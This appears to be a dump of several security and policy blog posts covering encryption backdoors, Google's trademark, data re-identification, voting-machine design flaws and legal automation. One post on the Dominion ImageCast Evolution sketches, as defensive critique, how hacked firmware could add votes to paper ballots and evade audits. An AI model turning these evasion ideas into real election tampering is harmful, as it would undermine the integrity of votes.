needed any more. The only way that we know how to build secure software is to make it simple, to use state of the art techniques, and to get rid of older feature that we know are weak. Backdoor engineering is the antithesis of this process. What are appropriate behaviors for an engineering organization like Apple? I’ll quote Google’s Eric Grosse: Eric Grosse, Google’s security chief, suggested in an interview that the N.S.A.’s own behavior invited the new arms race. “I am willing to help on the purely defensive side of things,” he said, referring to Washington’s efforts to enlist Silicon Valley in cybersecurity efforts. “But signals intercept is totally off the table,” he said, referring to national intelligence gathering. “No hard feelings, but my job is to make their job hard,” he added. As a national policy matter, we need to decide what’s more important: backdoor access to user data, or robustness against nation-state adversaries. If you want backdoor access, then the cascade of engineering decisions that will be necessary to support those backdoors will fundamentally weaken our national security posture. On the flip side, strong defenses are strong against all adversaries, including the domestic legal system. Indeed, the FBI and other law enforcement agencies will need to come to terms with the limits of their cyber-investigatory powers. Yes the data you want is out there. No, you can’t get what you want, because cyber-defense must be a higher priority. What are the alternatives? Can the FBI make do without what it’s asking? How might the FBI cope in a world where Apple, Google, and other engineering organizations build walls that law enforcement cannot breach? I suspect they’ll do just fine. We know the FBI has remarkably good cyber-investigators. For example, the FBI hacked “approximately 1300” computers as part of a child pornography investigation. Likewise, even if phone data is encrypted, the metadata generated just walking around with a phone is amazing. For example, researchers discovered that data from just four, randomly chosen “spatio-temporal points” (for example, mobile device pings to carrier antennas) was enough to uniquely identify 95% of the individuals, based on their pattern of movement. In other words, even if you use “burner” phones, investigators can connect them together based on your patterns of movement. With techniques like this, the FBI has access to a mountain of data on their San Bernadino suspects, far more than they ever might have collected in the era before smartphones. In short, the FBI’s worries that targets of its investigations are “going dark” are simply not credible, and their attempts to coopt technology companies into give them back doors are working against our national interests."
"322","2014-09-13","2023-03-24","https://freedom-to-tinker.com/2014/09/13/google-fights-genericide-and-wins/","Google’s famous trademark in its name has just survived a challenger’s attempt to have it declared generic. In Elliott v. Google, a federal court in Arizona held last week that despite the public’s use of the word “googling” to mean “searching on the Internet,” the “Google” word mark still functions in the minds of consumers primarily to identify Google, the Mountain View-based Internet company, as the source of the search service associated with the “Google” mark. The plaintiff in the case argued that the public’s use of a trademark as a verb necessarily signifies that the mark has become generic. The court disagreed: Verb use of a trademark is not fundamentally incapable of identifying a producer or denoting source. A mark can be used as a verb in a discriminate sense so as to refer to an activity with a particular product or service, e.g., “I will PHOTOSHOP the image” could mean the act of manipulating an image by using the trademarked Photoshop graphics editing software developed and sold by Adobe Systems. This discriminate mark-as-verb usage clearly performs the statutory source-denoting function of a trademark. The court went on to explain that a problem arises for a mark owner only if mark-as-verb usage is indiscriminate, and the mark becomes referentially unmoored in the public’s mind from the mark owner’s product or service. Trademarks are classified in the law on a continuum of strength from fanciful to descriptive, with fanciful marks (like “Zynga”) being entitled to the strongest legal protection and descriptive marks (like “Fish-Fri”) entitled to the weakest. Generic marks merit no protection at all. The term “genericide” is used in trademark law to denote the passage of a trademark from its protected legal status as a unique source-identifier to a non-protected status as just another word in the language. Marks that are born fanciful can become generic over time if they are used often enough to describe the general category of product or service to which the mark owner’s product or service belongs, rather than the specific product or service offered by the mark owner. Examples of famous, and once strong, trademarks that have succumbed to genericide over the years include “zipper,” “escalator,” and “aspirin.” Xerox has been working hard to prevent its mark from becoming generic for many years, in part by politely asking the public in magazine ads not to use “xerox” to mean “make a photocopy.” Google’s Rules for Proper Usage of its trademarks include, among many others, the following requirements: Use the trademark only as an adjective, never as a noun or verb, and never in the plural or possessive form. Use a generic term following the trademark, for example: GOOGLE search engine, Google search, GOOGLE web search. Don’t use Google trademarks in a way that suggests a common, descriptive, or generic meaning. If the primary meaning of the word “Google” for the public becomes simply “to search the Internet” and not “to use the Google search engine to search the Internet,” Google will lose its property rights in the mark. I was curious to see whether and how “Google” is defined in popular dictionaries, so I looked at the Merriam-Webster Collegiate Dictionary online, which says that small-g “google” means “to use the Google search engine to obtain information about (as a person) on the World Wide Web.” That definition is good news for Google. Dictionary.com has a fuller and, from Google’s perspective, more problematic entry: Google [goo-guh l] noun, Trademark. 1. brand name of a leading Internet search engine, founded in 1998. verb (used with object), Googled, Googling. 2. (often lowercase) to search the Internet for information about (a person, topic, etc.): “We googled the new applicant to check her background.” verb (used without object), Googled, Googling. 3. (often lowercase) to use a search engine such as Google to find information, a website address, etc., on the Internet. Meaning #2 in the Dictionary.com definition should be a source of concern for Google’s trademark lawyers, because it reflects a trend toward widespread indiscriminate mark-as-verb usage. Meaning #3 also raises a red flag, insofar as it suggests that one might “google” something using a search engine other than Google’s. (If you, as I do, experience dissonance or confusion at the prospect of googling with Bing or Yahoo, then you and I and the Arizona court are all on the same page.) For as long as search-engine users mean “use Google to search” when they use “google” as a verb, the “Google” mark will retain its status as Google’s intellectual property. Google wants its name to be synonymous with search, but not in a way that undermines its trademark rights."
"323","2015-03-19","2023-03-24","https://freedom-to-tinker.com/2015/03/19/what-should-we-do-about-re-identification-a-precautionary-approach-to-big-data-privacy/","Computer science research on re-identification has repeatedly demonstrated that sensitive information can be inferred even from de-identified data in a wide variety of domains. This has posed a vexing problem for practitioners and policy makers. If the absence of “personally identifying information” cannot be relied on for privacy protection, what are the alternatives? Joanna Huey, Ed Felten, and I tackle this question in a new paper “A Precautionary Approach to Big Data Privacy”. Joanna presented the paper at the Computers, Privacy & Data Protection conference earlier this year. Here are some of the key recommendations we make. When data is released after applying current ad-hoc de-identification methods, the privacy risks of re-identification are not just unknown but unknowable. This is in contrast to provable privacy techniques like differential privacy. We therefore call for a weak version of the precautionary approach in which the burden of proof falls on data releasers. We recommend that they should be incentivized not to default to full, public releases of datasets using ad hoc de-identification methods. Policy makers have several levers to influence data releases: research funding choices that incentivize collaboration between privacy theorists and practitioners, mandated transparency of re-identification risks, and innovation procurement—using government demand to drive the development and diffusion of advanced privacy technologies. Meanwhile, practitioners and policymakers have numerous pragmatic options for narrower releases of data. We present advice for six of the most common use cases for sharing data. Our thesis is that the problem of “what to do about re-identification” unravels once we stop looking for a one-size-fits-all solution, and in each of the six cases we propose a solution that is tailored, yet principled. Our work draws from an earlier piece by Ed Felten and me last year titled “No silver bullet: De-identification still doesn’t work”. Building on the arguments we made there, we point out two nuances of re-identification that are often missed in the policy discussion. First, we explain why privacy risks exist even if re-identification doesn’t succeed in the stereotypical sense. Second, we draw a distinction between “broad” and “targeted” attacks which we’ve found to be a frequent source of confusion. As datasets get larger, more connected, and capture ever more intimate details of our lives, getting data privacy right continues to gain in importance. While de-identification is often useful as an additional privacy measure, by itself it offers insufficient and unreliable privacy protection. It is crucial for data custodians, policy makers, and regulators to embrace a more technologically sound approach to big data privacy, and we hope that our recommendations will contribute to this shift."
"324","2019-05-03","2023-03-24","https://freedom-to-tinker.com/2019/05/03/imagecast-evolution-voting-machine-mitigations-misleadings-and-misunderstandings/","Two months ago I wrote that the New York State Board of Elections was going to request a reexamination of the Dominion ImageCast Evolution voting machine, in light of a design flaw that I had previously described. The Dominion ICE is an optical-scan voting machine. Most voters are expected to feed in a hand-marked optical scan ballot; but the ICE also has an integrated ballot-marking device for use by those voters who wish to mark their ballot by machine. The problem is, if the ICE’s software were hacked, the hacked software could make the machine print additional (fraudulent votes) onto hand-marked paper ballots. This would defeat the purpose of voter-verifiable paper ballots, which are meant to serve as a safeguard against buggy or fraudulent software. The Board of Elections commissioned an additional report from SLI Compliance, which had done the first certification of this machine back in April 2018. SLI’s new report dated March 14, 2019 is quite naive: they ran tests on the machine and “at no point was the machine observed making unauthorized additions to the ballots.” Well indeed, if you test a machine that hasn’t (yet) been hacked, it won’t misbehave. (SLI’s report is pages 7-9 of the combined document.) The Board of Elections then commissioned NYSTEC, a technology consulting company, to analyze SLI’s report. NYSTEC seems less naive: they summarized the issue under examination as follows: NYSTEC, NYS State Board of Elections and computer science experts have long agreed that when an adversary has the ability to modify or replace the software/firmware that controls a voting machine then significant and damaging impacts to an election are possible. What makes this type of attack [the one described by Prof. Appel] different however is that the voted paper ballots from a compromised combination BMD/scanner machine could not be easily used to audit the scanner results because they have been compromised. If the software/firmware was compromised to alter election results, on a regular scanner (without BMD capabilities) one still has the voted ballots to ensure the election can be properly decided. This would not be the case with the BMD/scanner attack and if such an attack were to occur, then a forensic analysis would be needed on all ballots in question to determine if a human or machine made the mark. Such a process is unlikely to be trusted by the public.[page 12 of the combined document] NYSTEC’s report (and not just this paragraph) agrees that (1) the hardware is physically capable of marking additional votes onto a voted ballot and (2) this is a very serious problem. SLI seems more confused: they say the source code they reviewed will not (ask the hardware to) mark additional votes onto a voted ballot. Mitigations (practical or not?) NYSTEC suggests that the problem could be mitigated by physically preventing the hardware from printing votes onto any ballot except when the machine is deliberately being used in BMD mode (e.g., to accommodate a voter with a disability). Their suggested physical mitigations are: * Leave the printer access panel open as this will prevent an unauthorized ballot from being marked without detection. * Remove the printer ink and only insert it when the system is being used in BMD mode. * Insert a foam block inside the printer carriage, as this will prevent the system from ever printing on an already voted ballot. [page 73 of the combined document] Then they explain why some of these physical mitigations “may not be feasible.” Without the mitigations, NYSTEC rates the “Impact” of this Threat Scenario as “Very High”, and with the mitigations they rate the impact as “Low”. Misleadings Based on the reports from SLI and NYSTEC, the operations staff (Thomas Connolly, Director of Operations) of the Board of Elections prepared a 3-page recommendation [pages 2-4 of the combined document]. The staff’s key statement is a mischaracterization of NYSTEC’s conclusion: they write, “NYSTEC believes that SLI security testing of the Dominion source code provided reasonable assurance that malicious code that could be triggered to enable the machine to print additional marks on an already marked ballot, is not present in the version tested.” Yes, NYSTEC remarks in passing that Dominion’s source code submitted for review does not already contain malicious code, but that’s not the conclusion of NYSTEC’s own report! NYSTEC’s actual recommendation is that this is a real threat, and election officials who use this machine should perform mitigations. The staff’s recommendation is to mitigate by (1) leaving the printer access panel open, which prevents printed-on ballots from proceeding automatically to the ballot box (a “preventative control”), (2) checking the printer’s “hardware counter” at the close of polls to see if more pages were printed on than the number of voters who used BMD-mode (a “detective control”), and (3) instructing pollworkers to be aware of the “printer running when it should not be” (a “detective control”). (I wonder whether the so-called “hardware counter” is really under the control of software.) The NY State Board of Elections, at its meeting of April 29, 2019, accepted the recommendations of the Board staff. (This video, from 37:30 to 44:20). Commissioner Kellner did point out that, indeed, it is a misunderstanding of computer security to say that because the malicious code is not already present in the source code, there is no threat from malicious code. Misunderstandings (deliberate or not?) The Board of Elections also directed Dominion to revise its “Threat Register”, that is, the security threats that should be considered when assessing the robustness of their voting machines. In response to the SLI and NYSTEC reports, Dominion added this: Tampering with installed software Description – The software installed on the PCOS devices is reviewed, built and tested by a Voting System Test Lab (VSTL). These Trusted Builds are installed on the PCOS devices and control their operation. A special set of credentials is required to install the software and integrity checks are performed during installation to ensure a valid build is being installed. Hash values are generated by the VSTL for both the installation files and the files on the PCOS device after installation. The hash values are recorded in a System ID Guide for jurisdictions to use to verify the integrity of the PCOS software. Threat – A malicious actor obtains unauthorized physical access to the PCOS devices after pre-election “logic and accuracy” testing but before Election Day, successfully defeating the physical controls that Election Administrators have in place. The installation software is counterfeited and fraudulent software is installed. The malicious actor also defeats the controls in place related to the hash codes which are verified on Election Day. Then, this malicious actor once again obtains unauthorized physical access to the PCOS devices after the Election, again defeating physical security practices in place, and installs the certified software after Election Day. Impact – By changing the software, the malicious actor makes the voting system inaccurate or inoperable. Impacted security pillars – Integrity and availability. Risk rating – Low. Mitigation – Implement proper processes (access control) for memory card handling and device storage. Verify the integrity of the installation software prior to and after installation. During points where the physical chain of custody of a device is unknown, verify the integrity of the installed software. Cryptographic and digital signing controls mitigate tampering with installation software. Tampering is evident to operators when verifying the software installed on the device. For more information, refer to Sections 4 and 5.5 of this document. Also, refer to the VSTL generated hash values.[Page 76 of the combined document] There are two things to note here. First, this wasn’t already in their Threat Register by 2018? Really? Computer Scientists have been explaining for 20 years that the main threat to a voting machine is that someone might install fraudulent vote-stealing software, and Dominion Voting Systems didn’t notice that? Second, Dominion has written the Threat description in a very limited way: someone has physical access to the machine. But the threat is much broader than that. For example: (1) Someone anywhere in the world hacks into the computer systems of Dominion Voting Systems and alters the firmware-update image to be installed on new or field-upgraded voting machines. [Notice how they use the passive voice, “These Trusted Builds are installed on the PCOS devices” to avoid thinking about who installs them, and how they are installed, and what threats there might be to that process!] Now it doesn’t correspond to the source code that was inspected and certified. The hacker doesn’t need physical access to the voting machines at all! And the “hash codes” are not much help, because the fraudulent software can report the nonfraudulent hash codes. Or, (2) Someone steals the cryptographic keys, thus defeating the “cryptographic and digital signing controls.” Or (3) Don’t do it just before the election, do it once and let it be in effect for 10 elections in a row. Or (4) Bypass all the “cryptographic and digital signing controls” by hacking into the lower levels of the computer, through the BIOS, or through the OS, or the USB drivers, etc. Or (5), (6), (7) that I don’t have room to describe or haven’t even thought of. The point is, there are many ways into a computer system, and Dominion paints a false, rosy picture when limiting it to the same physical access attack that was already demonstrated on their previous generation of machines. Conclusion No one is asking companies like Dominion to do the impossible, that is, build a perfectly secure voting machine. (Well, actually, some people are asking, but please let’s recognize that it’s impossible.) Instead, we just want two things: Make them as secure as you can. Those “cryptographic and digital signing controls” are better than nothing (and weren’t present on voting machines built 15 years ago). Recognize that there’s no way to absolutely prevent them from being hacked, and that’s why we need Risk-Limiting Audits of the paper ballots. But those RLA’s won’t be effective if the hardware of the machine is designed so that (under the control of hacked software) it can mark more votes on the ballot after the last time the voter saw the paper. And I ask New York State: If some county actually buys these machines, will the county be required to adopt the mitigation procedures approved at the April 29th Board meeting?"
"325","2019-03-08","2023-03-24","https://freedom-to-tinker.com/2019/03/08/reexamination-of-an-all-in-one-voting-machine/","The co-chair of the New York State Board of Elections has formally requested that the Election Operations Unit of the State Board re-examine the State’s certification of the Dominion ImageCast Evolution voting machine. The Dominion ImageCast Evolution (also called Dominion ICE) is an “all-in-one” voting machine that combines in the same paper path an optical scanner (for hand-marked bubble ballots) with a printer (for machine-marked ballots via a touchscreen or audio interface). Last October, I explained that why this is such a bad idea that it should be considered a design flaw: if a hacker were able to install fraudulent software into the ICE, that software could print additional votes onto a voter’s ballot after the last time the voter sees the ballot. I’ll just give one example of what the hacker’s vote-stealing software could do: In any race where the voter undervotes (does not mark a choice), the hacked software could print a vote into the bubble for the candidate that the hacker wants to win. The manufacturer may argue that “our software doesn’t do that;” true enough, the factory-installed software doesn’t do that–unless hackers hack into the manufacturer’s network. They may argue that “our voting machines are not hackable;” well, it’s admirable that they are using modern-day authentication methods for the installation of new software, but in the current state of the art, it’s still the case that practically any computer is hackable. And therefore, we rely on recounts and risk-limiting audits of the paper ballot as marked by the voter as our ultimate protection against computer hacking. An all-in-one voting machine, that combines printing and scanning into the same paper path, seriously compromises that protection. Douglas A. Kellner, co-chair of the New York State Board of elections, wrote on March 7 2019 to his fellow Board commissioners, Two respected professors of computer science have provided reports that the Dominion ImageCast Evolution voting machine has a “design flaw.” … “after you mark your ballot, after you review your ballot, the voting machine can print more votes on it!” … [New York State] Election Law § 7-201 requires that the State Board of Elections examine and approve each type of voting machine or voting system before it can be used in New York State…. The examination criteria for certification of voting equipment … requires … “the vendor shall identify each potential point of attack.” … I have carefully reviewed Dominion’s [submission]. I do not see anything in the submission that addressed the point of attack or threats identified by Professors Appel and DeMillo. … If there is a serious possibility that an insider could install malware that could program the printer to add marks to a ballot without the possibility of verification by the voter, then the entire audit process is compromised and circumvented. If it was possible for the machine to add a voting mark to the ballot without verification by the voter, the audit is not meaningful because it cannot confirm that the ballot was counted in the manner intended by the voter. … Election Law § 7-201(3) provides that: “If at any time after any machine or system has been approved,…the state board of elections has any reason to believe that such machine or system does not meet all the requirements for voting machines or systems set forth in this article, it shall forthwith cause such machine or system to be examined again.” … In view of the omission of the security threats identified by Professors Appel and DeMillo in the submission by Dominion in support of its application for certification of the ImageCast Evolution, and in view of the absence of any analysis of this issue in the SLI and NYSTEC reports, I request that the Election Operations Unit of the State Board examine again the ImageCast Evolution to consider the vulnerability of the voting system because the printer could be programmed to add marks to ballots without verification by the voter, and that SLI and NYSTEC supplement their reports with respect to these issues."
"326","2018-10-16","2023-03-24","https://freedom-to-tinker.com/2018/10/16/design-flaw-in-dominion-imagecast-evolution-voting-machine/","The Dominion ImageCast Evolution looks like a pretty good voting machine, but it has a serious design flaw: after you mark your ballot, after you review your ballot, the voting machine can print more votes on it!. Fortunately, this design flaw has been patented by a rival company, ES&S, which sued to prevent Dominion from selling this bad design. Unfortunately, that means ES&S can still sell machines (such as their ExpressVote all-in-one) incorporating this design mistake. When we use computers to count votes, it’s impossible to absolutely prevent a hacker from replacing the computer’s software with a vote-stealing program that deliberately miscounts the vote. Therefore (in almost all the states) we vote on paper ballots. We count the votes with optical scanners (which are very accurate when they haven’t been hacked), and to detect and correct possible fraud-by-hacking, we recount the paper ballots by hand. (This can be a full recount, or a risk-limiting audit, an inspection of a randomly selected sample of the ballots.) Some voters are unable to mark their ballots by hand–they may have a visual impairment (they can’t see the ballot) or a motor disability (they can’t physically handle the paper). Ballot-marking devices (BMDs) are provided for those voters (and for any other voters that wish to use them); the BMDs are equipped with touchscreens, and also with audio and tactile interfaces (headphones and distinctively shaped buttons) for blind voters, and even sip-and-puff input devices for motor-impaired voters. These BMDs print out a paper ballot that can be scanned by the optical scanners and can be recounted by hand. In a typical polling place, there are cardboard privacy screens for those voters who use a pen to fill in the the bubbles on their op-scan ballots; one BMD for voters who want machine assistance marking their ballots; and one optical scanner into which all voters deposit their ballots. In contrast, the ImageCast Evolution is an “all-in-one” device: combination BMD and optical scanner. Most voters fill out their ballots by hand, and insert into the scanning slot. But those using the BMD feature will insert a blank ballot into the scanning slot; after they indicate their choices using the touchscreen or audio/button interface, the ImageCast Evolution will fill in the bubbles on their ballot for them. Combining the BMD+scanner is a really bad idea! Remember, the purpose of the paper ballot is to guard against cheating by hacked voting computers. If the optical-scanners have been hacked, they lie about what’s on the paper ballots. We can detect this fraud by recounting a random sample of the paper ballots. But the ImageCast Evolution can print right onto your ballot, after you insert it into the slot. From the diagram of the paper path, above, it’s pretty clear that the same bidirectional paper path contains both the scanner and the printer. That means it can cast more votes onto your ballot. Of course, the legitimate software installed by Dominion won’t do that, but the machine is physically capable of it, and fraudulent software can exploit this ability. When I feed my marked ballot into an optical scanner, I do not want the optical scanner to have the ability to fill in more bubbles on my ballot! The whole purpose of the paper ballots, and the human-inspection random audits, and the human-inspection recounts, is to guard against the possibility that a hacker installed cheating software into the voting machine. If the cheating software can mark my ballot, after the last time I can inspect it, then the ballot seen by the recount team is not the same as I marked it. This appears to be an elementary security-design mistake. Security design isn’t easy! A good security designer has to be able to think adversarially, to understand the threat model, to understand how the software could subvert the hardware. In this case, the threat is: Hacker exploits a security vulnerability of the ImageCast voting machine or on the election-administration laptop computer that prepares ballot files. For example, the ImageCast has several USB ports, and USB is notoriously insecure. Hacker uses this vulnerability to install additional software on the ImageCast, that fills in additional ovals on the op-scan ballot, after the voter has inserted it for scanning. For extra credit, don’t perfectly fill in the ovals like a BMD normally would; instead, mimic the style that the voter has used with a pen. For double-extra-credit, do this only when the scanner detects that the voter has used a similar color pen to the ink-jet cartridge in the BMD’s printer. For triple-extra-credit, only fill in ovals in races where the voter hasn’t already marked a vote, this avoids overvotes that would draw attention to the paper ballot during an audit or recount. References: ImageCast Evolution product brochure. Another ImageCast Evolution product brochure Video (click here, scroll down to ImageCast Evolution, click on the first blue square labeled “VIDEO”) Dual Display Brochure Dual Display Video (click here, scroll down to ImageCast Evolution, click on the second blue square labeled “VIDEO”). Dave (Jing) Tian, Nolen Scaife, Deepak Kumar, Michael Bailey, Adam Bates, Kevin R. Butler. SoK: “Plug & Pray” Today – Understanding USB Insecurity in Versions 1 through C. 39th IEEE Symposium on Security and Privacy (Oakland ’18), May 2018. Kevin Skoglund, personal communication, June 2018: “In August 2017, ES&S sued Dominion alleging that the ImageCast Evolution infringed on their patents. In several demos since then [in Harrisburg, PA and in Montgomery County, PA], Dominion has not featured the ICE even though it is still prominent on their website. Instead they have featured the ImageCast X which is not even listed on their website. The lawsuit appears to have been settled on June 12. Settlements are typically confidential so there will be no public documents on it.” —– Note added on March 5, 2019: This machine has a “permission to cheat” mode just like the ES&S ExpressVote. On January 23, 2019, addressing the Westchester County (NY) Budget and Appropriations Committee, Dominion regional sales manager Gio Constantiello explained (at minute 0:41:40) that the voter using the BMD has the option of having the ballot ejected for inspection before reinserting it for scanning, or can choose to have the BMD-marked ballot directly scanned and dropped into the ballot box without any human inspection."
"327","2018-09-14","2023-03-24","https://freedom-to-tinker.com/2018/09/14/serious-design-flaw-in-ess-expressvote-touchscreen-permission-to-cheat/","Kansas, Delaware, and New Jersey are in the process of purchasing voting machines with a serious design flaw, and they should reconsider while there is still time! Over the past 15 years, almost all the states have moved away from paperless touchscreen voting systems (DREs) to optical-scan paper ballots. They’ve done so because if a paperless touchscreen is hacked to give fraudulent results, there’s no way to know and no way to correct; but if an optical scanner were hacked to give fraudulent results, the fraud could be detected by a random audit of the paper ballots that the voters actually marked, and corrected by a recount of those paper ballots. Optical-scan ballots marked by the voters are the most straightforward way to make sure that the computers are not manipulating the vote. Second-best, in my opinion, is the use of a ballot-marking device (BMD), where the voter uses a touchscreen to choose candidates, then the touchscreen prints out an optical-scan ballot that the voter can then deposit in a ballot box or into an optical scanner. Why is this second-best? Because (1) most voters are not very good at inspecting their computer-marked ballot carefully, so hacked BMDs could change some choices and the voter might not notice, or might notice and think it’s the voter’s own error; and (2) the dispute-resolution mechanism is unclear; pollworkers can’t tell if it’s the machine’s fault or your fault; at best you raise your hand and get a new ballot, try again, and this time the machine “knows” not to cheat. Third best is “DRE with paper trail”, where the paper ballot prints out behind glass; the voter can inspect it, but it can be difficult and discouraging to read a long ballot behind glass, and there’s pressure just to press the “accept” button and get on with it. With hand-marked optical-scan ballots there’s much less pressure to hurry: you’re not holding up the line at the voting machine, you’re sitting at one of the many cheap cardboard privacy screens with a pen and a piece of paper, and you don’t approach the optical scanner until you’re satisfied with your ballot. That’s why states (such as North Carolina) that had previously permitted “DRE with paper trail” moved last year to all optical-scan. Now there’s an even worse option than “DRE with paper trail;” I call it “press this button if it’s OK for the machine to cheat” option. The country’s biggest vendor of voting machines, ES&S, has a line of voting machines called ExpressVote. Some of these are optical scanners (which are fine), and others are “combination” machines, basically a ballot-marking device and an optical scanner all rolled into one. This video shows a demonstration of ExpressVote all-in-one touchscreens purchased by Johnson County, Kansas. The voter brings a blank ballot to the machine, inserts it into a slot, chooses candidates. Then the machine prints those choices onto the blank ballot and spits it out for the voter to inspect. If the voter is satisfied, she inserts it back into the slot, where it is counted (and dropped into a sealed ballot box for possible recount or audit). So far this seems OK, except that the process is a bit cumbersome and not completely intuitive (watch the video for yourself). It still suffers from the problems I describe above: voter may not carefully review all the choices, especially in down-ballot races; counties need to buy a lot more voting machines, because voters occupy the machine for a long time (in contrast to op-scan ballots, where they occupy a cheap cardboard privacy screen). But here’s the amazingly bad feature: “The version that we have has an option for both ways,” [Johnson County Election Commissioner Ronnie] Metsker said. “We instruct the voters to print their ballots so that they can review their paper ballots, but they’re not required to do so. If they want to press the button ‘cast ballot,’ it will cast the ballot, but if they do so they are doing so with full knowledge that they will not see their ballot card, it will instead be cast, scanned, tabulated and dropped in the secure ballot container at the backside of the machine.” [TYT Investigates, article by Jennifer Cohn, September 6, 2018] Now it’s easy for a hacked machine to cheat undetectably! All the fraudulent vote-counting program has to do is wait until the voter chooses between “cast ballot without inspecting” and “inspect ballot before casting”. If the latter, then don’t cheat on this ballot. If the former, then change votes how it likes, and print those fraudulent votes on the paper ballot, knowing that the voter has already given up the right to look at it. Johnson County should not have bought these machines; if they’re going to use them, they must insist that ES&S disable this “permission to cheat” feature. Union County New Jersey and the entire state of Delaware are (to the best of my knowledge) in the process of purchasing ExpressVote XL machines, which are like the touchscreens shown in the video but with a much larger screen that can show the whole ballot at once. New Jersey and Delaware should not buy these machines. If they insist on buying them, they must disable the “permission to cheat” feature. Of course, if the permission-to-cheat feature is disabled, that reverts to the cumbersome process shown in the video: (1) receive your bar-code card and blank ballot from the election worker; (2) insert the blank ballot card into the machine; (3) insert the bar-code card into the machine; (4) make choices on the screen; (5) press the “done” button; (6) wait for the paper ballot to be ejected; (7) compare the choices listed on the ballot with the ones you made on the screen; (8) put the ballot back into the machine. Wouldn’t it be better to use conventional optical-scan balloting, as most states do? (1) receive your optical-scan ballot from the election worker; (2) fill in the ovals with a pen, behind a privacy screen; (3) bring your ballot to the optical scanner; (4) feed your ballot into the optical scanner. I thank Professor Philip Stark (interviewed in the TYT article cited above) for bringing this to my attention."
"328","2015-08-10","2023-03-24","https://freedom-to-tinker.com/2015/08/10/how-not-to-measure-security/","A recent paper published by Smartmatic, a vendor of voting systems, caught my attention. The first thing is that it’s published by Springer, which typically publishes peer-reviewed articles – which this is not. This is a marketing piece. It’s disturbing that a respected imprint like Springer would get into the business of publishing vendor white papers. There’s no disclaimer that it’s not a peer-reviewed piece, or any other indication that it doesn’t follow Springer’s historical standards. The second, and more important issue, is that the article could not possibly have passed peer review, given some of its claims. I won’t go into the controversies around voting systems (a nice summary of some of those issues can be found on the OSET blog), but rather focus on some of the security metrics claims. The article states, “Well-designed, special-purpose [voting] systems reduce the possibility of results tampering and eliminate fraud. Security is increased by 10-1,000 times, depending on the level of automation.” That would be nice. However, we have no agreed-upon way of measuring security of systems (other than cryptographic algorithms, within limits). So the only way this is meaningful is if it’s qualified and explained – which it isn’t. Other studies, such as one I participated in (Applying a Reusable Election Threat Model at the County Level), have tried to quantify the risk to voting systems – our study measured risk in terms of the number of people required to carry out the attack. So is Smartmatic’s study claiming that they can make an attack require 10 to 1000 more people, 10 to 1000 times more money, 10 to 1000 times more expertise (however that would be measured!), or something entirely different? But the most outrageous statement in the article is this: The important thing is that, when all of these methods [for providing voting system security] are combined, it becomes possible to calculate with mathematical precision the probability of the system being hacked in the available time, because an election usually happens in a few hours or at the most over a few days. (For example, for one of our average customers, the probability was 1×10-19. That is a point followed by 19 [sic] zeros and then 1). The probability is lower than that of a meteor hitting the earth and wiping us all out in the next few years—approximately 1×10-7 (Chemical Industry Education Centre, Risk-Ed n.d.)—hence it seems reasonable to use the term ‘unhackable’, to the chagrin of the purists and to my pleasure. As noted previously, we don’t know how to measure much of anything in security, and we’re even less capable of measuring the results of combining technologies together (which sometimes makes things more secure, and other times less secure). The claim that putting multiple security measures together gives risk probabilities with “mathematical precision” is ludicrous. And calling any system “unhackable” is just ridiculous, as Oracle discovered some years ago when the marketing department claimed their products were “unhackable”. (For the record, my colleagues in engineering at Oracle said they were aghast at the slogan.) As Ron Rivest said at a CITP symposium, if voting vendors have “solved the Internet security and cybersecurity problem, what are they doing implementing voting systems? They should be working with the Department of Defense or financial industry. These are not solved problems there.” If Smartmatic has a method for obtaining and measuring security with “mathematical precision” at the level of 1019, they should be selling trillions of dollars in technology or expertise to every company on the planet, and putting everyone else out of business. I debated posting this blog entry, because it may bring more attention to a marketing piece that should be buried. But I hope that writing this will dissuade anyone who might be persuaded by Smartmatic’s unsupported claims that masquerade as science. And I hope that it may embarrass Springer into rethinking their policy of posting articles like this as if they were scientific."
"329","2014-06-02","2023-03-24","https://freedom-to-tinker.com/2014/06/02/if-robots-replace-lawyers-will-politics-calm-down/","[TL;DR: Probably not.] A recent essay from law professor John McGinnis, titled “Machines v. Lawyers,” explores how machine learning and other digital technologies may soon reshape the legal profession, and by extension, how they may change the broader national policy debate in which lawyers play such key roles. His topic and my life seem closely related: After law school, instead of taking the bar, I became a consultant to public interest organizations and governments on the intersection of computing, law and public policy. McGinnis sees computing as an increasingly compelling substitute for many of the most routine tasks currently done by human lawyers, and on that he must be right: “[T]he large number of journeyman lawyers—such as those who do routine wills, vet house closings, write standard contracts, or review documents on a contractual basis—face a bleak future” as automation increasingly supplants their daily work. But what about the more difficult cognitive work of the law — how much difference will technology make there? McGinnis is an optimist about the pace and scope of technological advancement, perhaps slightly under the spell of Felten’s Third Law. He predicts that in legal research, “machine intelligence will supplant lawyers’ legal search function,” but this strikes me as overly optimistic: a lawyer’s human skill in rhetoric, her flair for evocative analogies or telling hypotheticals, will often determine in practice how far her argument gets, and those judgments don’t reduce cleanly to the kinds of computational problems for which computers are well suited. Robot Robot & Hwang may someday become competent local counsel in cyberspace, but it’s not about to have a strong appellate group. There probably are some briefs simple enough to be drafted by tomorrow’s computers. This may be particularly true in the criminal law, where the same points of well-settled law are constantly being adjudicated with respect to distinct but parallel facts. (I am thinking, for example, of the sufficiency of the evidence appeals filed in large numbers by criminal defendants who have been convicted of drug possession.) In all likelihood, there is a great deal of rote paperwork, remote from the kinds of law that the chattering classes tend to practice, that can usefully be automated. McGinnis is also right to note that data-driven predictions of legal outcomes will likely become more important. (It’s worth noting that much of the hyper-specialization we see in large law firms today can be traced to a decades-old trend of the general counsels’ offices of major corporations adopting computerized assessment methods for evaluating the performance of their outside counsel.) But the biggest question of all is how these changes in the law may change society: The most profound long-term effect of the rise of machine intelligence on the legal world may be a decline in lawyers’ social influence. . . . [M]achine intelligence empowers those involved in computation at the expense of those skilled at rhetoric. To some degree, engineers—the descendants, really, of blacksmiths—are destined to replace the wordsmiths in society’s commanding heights. . . . The rise of computational innovators may also foster a more data-driven politics. A modern, law-oriented politics often is excessively rhetorical; competing ideals quickly become abstractions. We debate same-sex marriage, for instance, at the federal level in terms of claims about equality, and school funding at the state level in terms of a right to education. The relentless march of computation, by contrast, permits a focus on the actual effects of social policies and encourages experiments to test those effects. This is a fascinating idea, and I think it’s half right: the importance of quantitative evidence in national politics will likely increase with time, but it will matter most at the edges, rather than in core ideological debates. I doubt that computers will ever be much better than humans at foreseeing the unintended, unanticipated results that so often flow from major public policies. (Who knew, for example, that the CAFE fuel economy standards for cars, which made them smaller and lighter than some drivers wanted, would in turn spark a boom in gas-guzzling SUVs, which are exempt from the rule because they are deemed “trucks” rather than cars?) But, there is indeed a general quantitative turn in public life, and it 